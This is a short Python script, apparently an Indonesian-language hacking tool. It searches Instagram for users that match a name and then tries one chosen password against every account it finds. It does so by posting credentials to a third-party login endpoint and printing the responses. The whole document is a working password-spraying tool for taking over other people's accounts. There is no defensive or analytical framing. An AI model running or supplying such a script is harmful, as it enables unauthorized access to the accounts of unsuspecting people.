import json
import requests
import os
from bs4 import BeautifulSoup as parser
from multiprocessing.pool import ThreadPool
os.system('cls' if os.name == 'nt' else 'clear')

def brute(usr, pasw):
	try:
		head = {'user-agent':'Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2','x-requested-with':'XMLHttpRequest','Referer':'https://outig.com/login/',}
		datain = {'username':usr,'password':pasw}
		run = requests.post('https://outig.com/login/user_login.php', data=datain, headers=head).text
		run2 = parser(run,"html.parser")
		run3 = run2.find('b')
		res = ("Username : "+usr+"\n"+run3.text).replace("<\/div>","").replace("<\/b>","").replace("\/","/").replace('"}','')
		print(res)
		print('')
	except requests.exceptions.ConnectionError:
		exit('! Tidak Ada Koneksi')

name = input('\x1b[1;97m# Search Name  : ')
pasw = input('# Set Password : ')
while len(pasw) < 8:
	print('-'*40)
	print('! Password Minimal 8 Huruf Atau Lebih')
	pasw = input('# Set Password : ')
print('-'*40)
try:
	headers = {"User-Agent":"Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2"}
	data = requests.get(f"https://www.instagram.com/web/search/topsearch/?context=blended&query={name}",headers=headers).text
	data = json.loads(data)
	jml = 0
	for data in data['users']:
		jml += 1
		username = data['user']['username']
		brute(username, pasw)
except requests.exceptions.ConnectionError:
	exit('! Tidak Ada Koneksi')
